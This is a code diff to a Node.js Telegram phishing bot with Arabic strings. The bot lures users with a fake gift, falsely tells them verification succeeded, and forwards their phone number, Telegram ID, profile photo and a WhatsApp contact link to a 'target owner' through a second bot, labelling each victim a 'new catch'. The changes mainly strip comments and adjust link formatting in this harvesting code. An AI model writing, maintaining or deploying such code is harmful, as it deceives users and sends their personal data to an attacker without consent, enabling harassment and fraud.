@@ -100,11 +100,9 @@ bot.on('contact', async (msg) => {
         console.log("تعذر جلب صورة الحساب:", e.message);
     }
 
-    // رابط الواتساب التلقائي مع الرسالة
     const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
     const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
 
-    // بناء رسالة التقرير مع رابط الواتساب المباشر داخل النص لتفادي أخطاء الأزرار
     const reportMessage = `
 🚨 **صيد جديد تم رصده!**
 
@@ -113,11 +111,10 @@ bot.on('contact', async (msg) => {
 🆔 **الأيدي:** ${userId}
 📞 **رقم الهاتف:** +${phone}
 🔗 **رابط الحساب:** tg://user?id=${userId}
-💬 **رابط الواتساب المباشر:** [محادثة واتساب مع الضحية](${whatsappLink})
+💬 **رابط الواتساب المباشر:** ${whatsappLink}
 🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "غير معروف"}
 `;
 
-    // الرد على المستخدم لإخفاء الكيبورد
     await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
         reply_markup: { remove_keyboard: true }
     });
@@ -125,7 +122,6 @@ bot.on('contact', async (msg) => {
     if (targetOwnerId) {
         try {
             if (profilePhotoUrl) {
-                // إرسال الصورة مع التقرير بدون أزرار شفافة لتجنب خطأ الـ Bad Request
                 await notifierBot.sendPhoto(targetOwnerId, profilePhotoUrl, {
                     caption: reportMessage,
                     parse_mode: "Markdown"
